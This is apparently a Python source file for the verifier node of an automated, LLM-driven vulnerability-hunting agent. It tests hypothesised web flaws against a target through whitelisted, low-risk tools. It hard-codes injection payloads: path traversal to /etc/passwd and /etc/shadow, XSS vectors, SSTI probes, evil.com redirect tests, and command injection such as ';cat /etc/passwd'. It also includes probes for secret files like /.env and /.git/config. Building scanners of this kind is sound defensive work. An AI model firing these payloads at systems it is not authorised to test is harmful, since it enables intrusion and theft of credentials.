"""
Verifier 节点

LangGraph 图中的漏洞验证节点。负责：
1. 读取黑板上的待验证假设
2. 使用实际安全工具（HTTP请求、SQLi检测、SSRF检测等）验证假设
3. 将 LLM 分析 + 工具验证结果结合，判断漏洞是否真实存在
4. 记录验证结果，更新黑板上的 findings 和 false_positives
5. 作为风控守门员，拒绝高危操作
"""

import json
import logging
import uuid
from datetime import datetime, timezone

from app.agents.emit import emit
from app.agents.llm import LLMClient
from app.agents.prompts.verifier import VERIFIER_SYSTEM_PROMPT
from app.agents.state import SlotStatus, VulnFinding, VulnHuntState
from app.tools.base import ExecutionContext, RiskLevel

logger = logging.getLogger(__name__)

_llm_client: LLMClient | None = None


def _get_llm_client() -> LLMClient:
    """获取或创建 LLM 客户端单例"""
    global _llm_client
    if _llm_client is None:
        _llm_client = LLMClient()
    return _llm_client


def _build_execution_context(state: VulnHuntState) -> ExecutionContext:
    """从黑板状态构建工具执行上下文"""
    bb = state["blackboard"]
    target_profile = bb.target_profile or {}
    base_url = target_profile.get("base_url", "")

    from urllib.parse import urlparse
    parsed = urlparse(base_url)
    host = parsed.hostname or "localhost"
    port = parsed.port

    # 构建允许的主机列表：主域名（含端口变体）
    allowed = [host]
    if port and port not in (80, 443):
        allowed.append(f"{host}:{port}")

    return ExecutionContext(
        task_id=state["task_id"],
        target_host=host,
        timeout=30,
        max_retries=2,
        allowed_hosts=allowed,
    )


async def _run_tool(tool_name: str, params: dict, context: ExecutionContext) -> dict:
    """
    安全地执行工具，捕获异常避免中断整体流程

    Returns:
        工具执行结果字典，失败时返回 {success: False, error: ...}
    """
    from app.tools import tool_registry

    tool = tool_registry.get(tool_name)
    if tool is None:
        return {"success": False, "error": f"工具 {tool_name} 未注册"}

    # MVP 阶段只允许 L0/L1 工具
    if tool.risk_level > RiskLevel.L1:
        return {"success": False, "error": f"工具 {tool_name} 风险等级 {tool.risk_level.name} 超出 MVP 允许范围"}

    try:
        result = await tool.execute(params, context)
        return result
    except Exception as e:
        logger.warning("工具 %s 执行异常: %s", tool_name, str(e))
        return {"success": False, "error": str(e)}


# 假设类型 → 推荐验证工具的映射
VERIFICATION_TOOLS: dict[str, list[dict]] = {
    "sql_injection": [
        {"tool": "sqli_detect", "param_key": "url"},
    ],
    "ssrf": [
        {"tool": "ssrf_detect", "param_key": "url"},
    ],
    "auth_bypass": [
        {"tool": "auth_test", "param_key": "url"},
    ],
    "xss": [
        {"tool": "http_request", "param_key": "url"},
    ],
    "lfi": [
        {"tool": "http_request", "param_key": "url"},
    ],
    "rce": [
        {"tool": "http_request", "param_key": "url"},
    ],
    "idor": [
        {"tool": "http_request", "param_key": "url"},
    ],
    "ssti": [
        {"tool": "http_request", "param_key": "url"},
    ],
    "info_disclosure": [
        {"tool": "http_request", "param_key": "url"},
    ],
    "open_redirect": [
        {"tool": "http_request", "param_key": "url"},
    ],
    "path_traversal": [
        {"tool": "http_request", "param_key": "url"},
    ],
    "file_upload": [
        {"tool": "http_request", "param_key": "url"},
    ],
}


def _get_real_params_for_url(state: VulnHuntState, target_url: str) -> list[str]:
    """
    从 attack_surface 中查找与 target_url 关联的真实参数名。
    优先精确匹配路径，退而求其次返回同域所有参数。
    """
    bb = state["blackboard"]
    attack_surface = bb.attack_surface or {}
    params_list = attack_surface.get("parameters", [])
    forms_list = attack_surface.get("forms", [])

    from urllib.parse import urlparse as _urlparse
    target_path = _urlparse(target_url).path.rstrip("/")

    # Exact match params for this path
    matched = []
    for p in params_list:
        p_url = p.get("url", "")
        p_path = _urlparse(p_url).path.rstrip("/") if p_url.startswith("http") else p_url.rstrip("/")
        if p_path == target_path:
            matched.append(p.get("name", ""))

    # Check forms
    for f in forms_list:
        action = f.get("action", "")
        action_path = action.rstrip("/") if not action.startswith("http") else _urlparse(action).path.rstrip("/")
        if action_path == target_path:
            matched.extend(f.get("params", []))

    if matched:
        return list(dict.fromkeys(matched))  # dedupe preserving order

    # Fallback: return all known params (for generic testing)
    all_params = [p.get("name", "") for p in params_list]
    all_params.extend(pn for f in forms_list for pn in f.get("params", []))
    return list(dict.fromkeys(all_params))[:5]


async def _verify_with_tools(hyp, context: ExecutionContext, state: VulnHuntState) -> dict:
    """
    使用工具对假设进行实际验证

    根据假设类型选择合适的工具执行，支持多 payload 变体探测。
    对于 http_request 通用类型，尝试多个 payload 直到确认或全部失败。

    Returns:
        {tool_used: str, tool_result: dict, tool_verified: bool}
    """
    vuln_type = hyp.type.lower()
    tool_configs = VERIFICATION_TOOLS.get(vuln_type, [])

    # 获取目标 base URL（含端口）
    bb = state["blackboard"]
    target_profile = bb.target_profile or {}
    base_url = target_profile.get("base_url", f"http://{context.target_host}")

    # 从 trigger_path 提取目标 URL
    target_url = ""
    if hyp.trigger_path:
        target_url = hyp.trigger_path[0]
        if not target_url.startswith("http"):
            target_url = f"{base_url.rstrip('/')}{target_url if target_url.startswith('/') else '/' + target_url}"

    # 没有目标 URL 时，尝试从 supporting_evidence 提取
    if not target_url and hyp.supporting_evidence:
        for evidence in hyp.supporting_evidence:
            if isinstance(evidence, str) and ("http://" in evidence or "/" in evidence):
                candidate = evidence.strip()
                if not candidate.startswith("http"):
                    candidate = f"{base_url.rstrip('/')}{candidate if candidate.startswith('/') else '/' + candidate}"
                target_url = candidate
                break

    if not target_url:
        target_url = base_url

    if not tool_configs:
        tool_configs = [{"tool": "http_request", "param_key": "url"}]

    # 依次尝试推荐的工具
    for cfg in tool_configs:
        tool_name = cfg["tool"]

        # 专用工具（sqli_detect, ssrf_detect, auth_test）走单次调用
        if tool_name != "http_request":
            params = {cfg["param_key"]: target_url}

            if tool_name == "sqli_detect":
                # sqli_detect requires "param" (the parameter name to inject into)
                # and "url" should be the base URL without query string
                from urllib.parse import parse_qs, urlparse as _urlparse
                _parsed = _urlparse(target_url)
                # Strip query string from URL for sqli_detect (it builds its own params)
                clean_url = f"{_parsed.scheme}://{_parsed.netloc}{_parsed.path}"
                params["url"] = clean_url

                if hyp.trigger_path and len(hyp.trigger_path) > 1:
                    params["param"] = hyp.trigger_path[1]
                else:
                    # Try to extract param from URL query string
                    _qs = parse_qs(_parsed.query)
                    if _qs:
                        params["param"] = next(iter(_qs))
                    else:
                        # No param to test — skip this tool
                        continue

            elif tool_name == "auth_test":
                # auth_test requires user_a_token; use a dummy token for unauthenticated comparison
                params["user_a_token"] = "dummy_test_token_12345"
                params["no_auth"] = True

            result = await _run_tool(tool_name, params, context)
            if result.get("success"):
                vulnerable = _evaluate_tool_result(vuln_type, tool_name, result)
                return {
                    "tool_used": tool_name,
                    "tool_result": result,
                    "tool_verified": vulnerable,
                }
            # Tool failed (connection error, whitelist block, etc.) — fall through to http_request
            logger.warning("专用工具 %s 执行失败: %s, 尝试 http_request 降级", tool_name, result.get("error", ""))
            # Use http_request as fallback for failed specialized tools
            real_params = _get_real_params_for_url(state, target_url)
            probes = _build_http_probe_list(vuln_type, target_url, hyp, real_params)
            for probe_params in probes:
                fallback_result = await _run_tool("http_request", probe_params, context)
                if fallback_result.get("success"):
                    vulnerable = _evaluate_tool_result(vuln_type, "http_request", fallback_result)
                    if vulnerable:
                        return {
                            "tool_used": "http_request",
                            "tool_result": fallback_result,
                            "tool_verified": True,
                        }
            return {
                "tool_used": tool_name,
                "tool_result": result,
                "tool_verified": False,
            }
        else:
            # http_request: 多 payload 变体探测
            real_params = _get_real_params_for_url(state, target_url)
            probes = _build_http_probe_list(vuln_type, target_url, hyp, real_params)
            for probe_params in probes:
                result = await _run_tool("http_request", probe_params, context)
                if result.get("success"):
                    vulnerable = _evaluate_tool_result(vuln_type, "http_request", result)
                    if vulnerable:
                        return {
                            "tool_used": "http_request",
                            "tool_result": result,
                            "tool_verified": True,
                        }
            # 所有 probe 都未确认
            return {
                "tool_used": "http_request",
                "tool_result": result if 'result' in dir() else None,
                "tool_verified": False,
            }

    return {"tool_used": None, "tool_result": None, "tool_verified": False}


def _build_http_probe_list(vuln_type: str, target_url: str, hyp, real_params: list[str] = None) -> list[dict]:
    """
    为 http_request 工具构造多个探测参数变体。
    每种漏洞类型返回 5-8 个不同 payload 变体以提高检出率。
    real_params: 从 attack_surface 获取的真实参数名列表。
    """
    probes = []
    base_params = {"method": "GET", "follow_redirects": False}

    # Determine which parameter names to inject into
    inject_params = real_params or []

    def _inject(url: str, payload: str, param_name: str = None) -> str:
        """Inject payload into URL. Use real param name if available."""
        if "=" in url:
            base, _ = url.rsplit("=", 1)
            return f"{base}={payload}"
        separator = "&" if "?" in url else "?"
        if param_name:
            return f"{url}{separator}{param_name}={payload}"
        # Fallback param name by vuln type
        fallback = "file" if vuln_type in ("lfi", "path_traversal") else "q"
        return f"{url}{separator}{fallback}={payload}"

    if vuln_type in ("lfi", "path_traversal"):
        payloads = [
            "....//....//....//etc/passwd",
            "..%2f..%2f..%2f..%2fetc%2fpasswd",
            "....//....//....//....//etc/shadow",
            "..\\..\\..\\..\\windows\\win.ini",
            "/etc/passwd",
            "....//....//....//proc/self/environ",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
        ]
        params_to_try = inject_params if inject_params else [None]
        for param_name in params_to_try:
            for p in payloads:
                probes.append({**base_params, "url": _inject(target_url, p, param_name)})

    elif vuln_type == "xss":
        payloads = [
            "<script>alert(1)</script>",
            "\"><img src=x onerror=alert(1)>",
            "'-alert(1)-'",
            "<svg/onload=alert(1)>",
            "javascript:alert(1)//",
            "<details/open/ontoggle=alert(1)>",
            "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
        ]
        params_to_try = inject_params if inject_params else [None]
        for param_name in params_to_try:
            for p in payloads:
                probes.append({**base_params, "url": _inject(target_url, p, param_name)})

    elif vuln_type == "ssti":
        payloads = [
            "${7*7}",
            "{{7*7}}",
            "#{7*7}",
            "${7*'7'}",
            "{{config}}",
            "<%= 7*7 %>",
            "{7*7}",
        ]
        params_to_try = inject_params if inject_params else [None]
        for param_name in params_to_try:
            for p in payloads:
                probes.append({**base_params, "url": _inject(target_url, p, param_name)})

    elif vuln_type == "open_redirect":
        payloads = [
            "https://evil.com",
            "//evil.com",
            "/\\evil.com",
            "https://evil.com%00",
            "//evil%2ecom",
        ]
        separator = "&" if "?" in target_url else "?"
        for param_name in ("redirect", "url", "next", "return_to", "goto"):
            for p in payloads[:2]:
                probes.append({**base_params, "url": f"{target_url}{separator}{param_name}={p}"})

    elif vuln_type == "rce":
        payloads = [
            ";id",
            "|id",
            "$(id)",
            "`id`",
            ";cat /etc/passwd",
            "|whoami",
            "&&id",
        ]
        params_to_try = inject_params if inject_params else [None]
        for param_name in params_to_try:
            for p in payloads:
                probes.append({**base_params, "url": _inject(target_url, p, param_name)})

    elif vuln_type == "info_disclosure":
        sensitive_paths = [
            "/.env", "/.git/config", "/web.config", "/phpinfo.php",
            "/server-status", "/.htaccess", "/wp-config.php.bak",
            "/api/swagger.json", "/actuator/env", "/.DS_Store",
        ]
        bb_base = target_url.rstrip("/")
        for sp in sensitive_paths:
            probes.append({**base_params, "url": f"{bb_base}{sp}"})

    elif vuln_type == "idor":
        if "=" in target_url:
            base, _ = target_url.rsplit("=", 1)
            for test_id in ["1", "2", "0", "9999", "-1", "admin"]:
                probes.append({**base_params, "url": f"{base}={test_id}"})
        else:
            probes.append({**base_params, "url": target_url})

    elif vuln_type == "file_upload":
        probes.append({**base_params, "url": target_url, "method": "POST"})

    if not probes:
        params_to_try = inject_params if inject_params else [None]
        for param_name in params_to_try:
            probes.append({**base_params, "url": _inject(target_url, "test", param_name)})

    # Cap total probes to avoid excessive requests (max 20 per hypothesis)
    return probes[:20]


def _build_http_probe_params(vuln_type: str, target_url: str, hyp) -> dict:
    """兼容接口：返回第一个 probe"""
    probes = _build_http_probe_list(vuln_type, target_url, hyp, [])
    return probes[0] if probes else {"url": target_url, "method": "GET", "follow_redirects": False}


def _evaluate_tool_result(vuln_type: str, tool_name: str, result: dict) -> bool:
    """根据漏洞类型和工具结果判断是否确认漏洞"""
    if tool_name == "auth_test":
        return result.get("unauth_access", False) or result.get("idor_detected", False)

    if tool_name == "sqli_detect":
        return result.get("vulnerable", False)

    if tool_name not in ("http_request",):
        return result.get("vulnerable", False) or result.get("found", False)

    body = result.get("body", "") or ""
    status = result.get("status_code", 0)
    headers = result.get("headers", {}) or {}

    if vuln_type in ("lfi", "path_traversal"):
        indicators = [
            "root:", "/bin/bash", "/bin/sh", "daemon:", "nobody:",
            "[boot loader]", "[extensions]", "[fonts]",
            "DOCUMENT_ROOT", "/usr/sbin/nologin",
        ]
        return any(ind in body for ind in indicators)

    elif vuln_type == "xss":
        xss_indicators = [
            "<script>alert(1)</script>",
            "onerror=alert(1)",
            "<svg/onload=alert(1)>",
            "ontoggle=alert(1)",
            "<img src=x onerror=",
        ]
        return any(ind in body for ind in xss_indicators)

    elif vuln_type == "ssti":
        ssti_confirmed = [
            ("49" in body and "{{7*7}}" not in body and "${7*7}" not in body),
            ("7777777" in body),
            ("SECRET_KEY" in body or "DEBUG" in body),
        ]
        return any(ssti_confirmed)

    elif vuln_type == "open_redirect":
        location = headers.get("location", "") or headers.get("Location", "")
        return ("evil.com" in location or
                (status in (301, 302, 303, 307, 308) and "evil.com" in (location or body)))

    elif vuln_type == "rce":
        rce_indicators = ["uid=", "gid=", "root:", "www-data", "whoami"]
        return any(ind in body for ind in rce_indicators)

    elif vuln_type == "info_disclosure":
        sensitive_patterns = [
            "password", "secret", "api_key", "token", "private_key",
            "phpinfo()", "DOCUMENT_ROOT", "SERVER_ADDR", "DB_PASSWORD",
            "AWS_SECRET", "MYSQL_PASSWORD", "[core]", "repositoryformatversion",
        ]
        return (any(p.lower() in body.lower() for p in sensitive_patterns) and
                status == 200 and len(body) > 20)

    elif vuln_type == "idor":
        return status == 200 and len(body) > 50

    return False


async def verifier_node(state: VulnHuntState) -> dict:
    """
    验证节点

    对黑板上所有 pending 状态的假设进行验证：
    1. 先用工具做实际验证
    2. 再用 LLM 综合工具结果和上下文做最终判断
    3. 将确认的漏洞写入 findings，误报写入 false_positives
    """
    bb = state["blackboard"]
    task_id = state["task_id"]
    iteration = state["iteration_count"]

    logger.info("Verifier 启动 - 任务 [%s], 迭代 %d", task_id, iteration)

    events = []
    context = _build_execution_context(state)

    await emit(task_id, "verifier", "agent_started", {"node": "verifier", "iteration": iteration})

    # 获取待验证假设
    pending = [h for h in bb.hypotheses if h.status == "pending"]

    if not pending:
        logger.info("没有待验证的假设，跳过验证阶段")
        await emit(task_id, "verifier", "no_pending", {"content": "没有待验证的假设"})
        events.append({
            "id": str(uuid.uuid4()),
            "agent": "verifier",
            "type": "no_pending",
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "data": {"content": "没有待验证的假设"},
        })
        await emit(task_id, "verifier", "agent_stopped", {"node": "verifier"})
        return {
            "blackboard": bb,
            "current_phase": "verifying",
            "iteration_count": iteration + 1,
            "events": events,
        }

    logger.info("开始验证 %d 个假设", len(pending))
    start_data = {
        "pending_count": len(pending),
        "hypothesis_ids": [h.id for h in pending],
    }
    await emit(task_id, "verifier", "verification_start", start_data)
    events.append({
        "id": str(uuid.uuid4()),
        "agent": "verifier",
        "type": "verification_start",
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "data": start_data,
    })

    llm = _get_llm_client()

    for hyp in pending:
        hyp.status = "testing"

        # === 第一步：工具验证 ===
        await emit(task_id, "verifier", "tool_call", {
            "tool_name": f"verify_{hyp.type}",
            "params": {"hypothesis_id": hyp.id, "type": hyp.type},
        })

        tool_result = await _verify_with_tools(hyp, context, state)

        tool_event_data = {
            "hypothesis_id": hyp.id,
            "tool_used": tool_result["tool_used"],
            "tool_verified": tool_result["tool_verified"],
        }
        await emit(task_id, "verifier", "tool_result", {
            "tool_name": tool_result["tool_used"] or "none",
            "success": tool_result["tool_verified"],
            "summary": f"假设 {hyp.type}: {'工具确认漏洞' if tool_result['tool_verified'] else '未确认'}",
        })
        events.append({
            "id": str(uuid.uuid4()),
            "agent": "verifier",
            "type": "tool_verification",
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "data": tool_event_data,
        })

        # === 第二步：LLM 综合判断 ===
        await emit(task_id, "verifier", "thinking", {
            "content": f"综合分析假设 {hyp.type} 的工具验证结果...",
        })

        hyp_context = {
            "hypothesis_id": hyp.id,
            "type": hyp.type,
            "description": hyp.description,
            "trigger_path": hyp.trigger_path,
            "preconditions": hyp.preconditions,
            "expected_impact": hyp.expected_impact,
            "confidence": hyp.confidence,
            "supporting_evidence": hyp.supporting_evidence,
            "tool_verification": {
                "tool_used": tool_result["tool_used"],
                "tool_verified": tool_result["tool_verified"],
                "tool_output": tool_result["tool_result"],
            },
        }

        messages = [
            {"role": "system", "content": VERIFIER_SYSTEM_PROMPT},
            {"role": "user", "content": (
                f"请综合工具验证结果和假设信息，做出最终判断：\n\n"
                f"{json.dumps(hyp_context, ensure_ascii=False, default=str)}\n\n"
                f"注意：tool_verified=true 表示工具已实际检测到漏洞存在。\n"
                f"请输出 JSON 格式的验证结果。"
            )},
        ]

        response_text = await llm.call(agent="verifier", messages=messages)
        result = _parse_verifier_response(response_text)

        # 最终判断: 必须有工具证据才能确认漏洞
        # LLM 只用于补充分析（severity、reproduction_steps），不能单独确认
        verified = tool_result["tool_verified"]
        severity = result.get("severity", "low")

        if verified:
            hyp.status = "confirmed"
            finding = VulnFinding(
                id=str(uuid.uuid4()),
                hypothesis_id=hyp.id,
                type=hyp.type,
                severity=severity,
                title=f"[{severity.upper()}] {hyp.type} - {hyp.description[:60]}",
                description=hyp.description,
                trigger_path=hyp.trigger_path,
                payload=hyp.supporting_evidence[0] if hyp.supporting_evidence else "",
                reproduction_steps=result.get("reproduction_steps", hyp.trigger_path),
                evidence={
                    "llm_analysis": result.get("evidence", {}),
                    "tool_output": tool_result["tool_result"],
                    "tool_used": tool_result["tool_used"],
                },
                verified=True,
            )
            bb.findings.append(finding)

            confirmed_data = {
                "hypothesis_id": hyp.id,
                "finding_id": finding.id,
                "type": hyp.type,
                "severity": severity,
                "verified_by_tool": tool_result["tool_verified"],
            }
            await emit(task_id, "verifier", "finding_confirmed", confirmed_data)
            events.append({
                "id": str(uuid.uuid4()),
                "agent": "verifier",
                "type": "finding_confirmed",
                "timestamp": datetime.now(timezone.utc).isoformat(),
                "data": confirmed_data,
            })
            logger.info("漏洞确认: [%s] %s (严重级别: %s)", hyp.id, hyp.type, severity)
        else:
            hyp.status = "rejected"
            fp_reason = result.get("false_positive_reason", "验证未通过")
            bb.false_positives.append({
                "hypothesis_id": hyp.id,
                "reason": fp_reason,
            })
            fp_data = {"hypothesis_id": hyp.id, "reason": fp_reason}
            await emit(task_id, "verifier", "false_positive", fp_data)
            events.append({
                "id": str(uuid.uuid4()),
                "agent": "verifier",
                "type": "false_positive",
                "timestamp": datetime.now(timezone.utc).isoformat(),
                "data": fp_data,
            })
            logger.info("假设否决: [%s] %s", hyp.id, hyp.type)

    # 更新黑板
    bb.slot_status["findings"] = SlotStatus.READY if bb.findings else SlotStatus.EMPTY
    bb.version += 1

    complete_data = {
        "findings_count": len(bb.findings),
        "false_positives_count": len(bb.false_positives),
    }
    await emit(task_id, "verifier", "verification_complete", complete_data)
    events.append({
        "id": str(uuid.uuid4()),
        "agent": "verifier",
        "type": "verification_complete",
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "data": complete_data,
    })

    logger.info("Verifier 完成: %d 个发现, %d 个误报", len(bb.findings), len(bb.false_positives))

    await emit(task_id, "verifier", "agent_stopped", {"node": "verifier"})

    return {
        "blackboard": bb,
        "current_phase": "verifying",
        "iteration_count": iteration + 1,
        "events": events,
    }


def _parse_verifier_response(response_text: str) -> dict:
    """解析 Verifier LLM 响应为字典，解析失败返回安全默认值"""
    try:
        result = json.loads(response_text)
        if isinstance(result, dict):
            return result
    except json.JSONDecodeError:
        pass

    try:
        start = response_text.find("{")
        end = response_text.rfind("}") + 1
        if start >= 0 and end > start:
            result = json.loads(response_text[start:end])
            if isinstance(result, dict):
                return result
    except json.JSONDecodeError:
        pass

    logger.warning("无法解析 Verifier 响应，使用默认结果: %s", response_text[:200])
    return {
        "verified": False,
        "risk_level": "L0",
        "severity": "low",
        "evidence": {},
        "reproduction_steps": [],
        "false_positive_reason": "响应解析失败",
    }
